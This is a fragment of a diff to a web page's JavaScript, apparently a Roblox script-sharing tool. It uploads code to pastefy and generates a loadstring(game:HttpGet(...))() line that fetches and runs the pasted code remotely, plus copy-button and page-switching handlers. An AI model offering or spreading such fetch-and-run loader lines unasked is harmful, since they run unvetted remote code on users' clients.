+      document.getElementById('result-output').value = `loadstring(game:HttpGet("https://pastefy.app/${d.paste.id}/raw"))()`;
+      document.getElementById('upload-result').style.display = 'block';
+      btn.textContent = 'Done!'; btn.classList.add('done');
+      setTimeout(() => { btn.textContent = 'Upload & Get Loadstring'; btn.classList.remove('done'); btn.disabled = false; }, 3000);
+    } else { btn.textContent = 'Upload failed'; setTimeout(() => { btn.textContent = 'Upload & Get Loadstring'; btn.disabled = false; }, 2500); }
+  } catch { btn.textContent = 'Upload failed'; setTimeout(() => { btn.textContent = 'Upload & Get Loadstring'; btn.disabled = false; }, 2500); }
 }
 
-document.getElementById('login-overlay').addEventListener('click', function(e) { if(e.target===this) closeLogin(); });
-loadSession();
-renderBrainrots(BRAINROTS);
+function copyResult() {
+  navigator.clipboard.writeText(document.getElementById('result-output').value);
+  const btn = document.getElementById('copy-result-btn');
+  btn.textContent = 'Copied!'; btn.classList.add('copied');
+  setTimeout(() => { btn.textContent = 'Copy'; btn.classList.remove('copied'); }, 2000);
+}
+
+function showPage(page) {
+  document.getElementById('page-home').style.display = page === 'home' ? 'flex' : 'none';
+  document.getElementById('page-uploader').style.display = page === 'uploader' ? 'flex' : 'none';
+  document.getElementById('page-leaderboard').style.display = page === 'leaderboard' ? 'flex' : 'none';
+}
+
+init();
 </script>
 </body>
 </html>
